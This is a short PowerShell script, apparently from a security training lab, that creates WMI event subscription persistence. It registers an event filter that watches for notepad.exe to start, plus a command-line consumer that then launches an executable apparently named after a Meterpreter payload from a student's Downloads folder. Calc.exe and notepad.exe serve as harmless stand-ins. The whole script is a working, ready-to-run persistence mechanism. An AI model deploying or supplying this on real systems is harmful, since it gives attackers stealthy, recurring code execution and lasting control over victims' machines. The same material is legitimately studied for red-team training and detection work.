$filterName = 'testingFilter' 
$consumerName = 'testingConsumer' 
$exePath = "powershell.exe -NoP -c `"invoke-expression '& c:\users\student\downloads\x64_meter_4545.exe'`""
$evilExe = "powershell.exe -NoP -c `"invoke-expression '& calc.exe'`""
$otherEvil = "powershell.exe -nop notepad.exe"


$q1 = "SELECT * FROM __InstanceCreationEvent WITHIN 5
                WHERE TargetInstance ISA 'Win32_Process'"


$q2 = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'"


$WMIEventFilter = Set-WmiInstance -Class __EventFilter `
                                  -NameSpace "root\subscription" `
                                  -Arguments @{Name=$filterName
                                               EventNameSpace="root\cimv2"
                                               QueryLanguage="WQL"
                                               Query=$q2
                                               } `
                                  -ErrorAction Stop 

$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer `
                                    -Namespace "root\subscription" `
                                    -Arguments @{Name=$consumerName                                        
                                                 CommandLineTemplate =$exePath
                                                 } 

Set-WmiInstance -Class __FilterToConsumerBinding `
                -Namespace "root\subscription" `
                -Arguments @{Filter=$WMIEventFilter
                             Consumer=$WMIEventConsumer
                             }
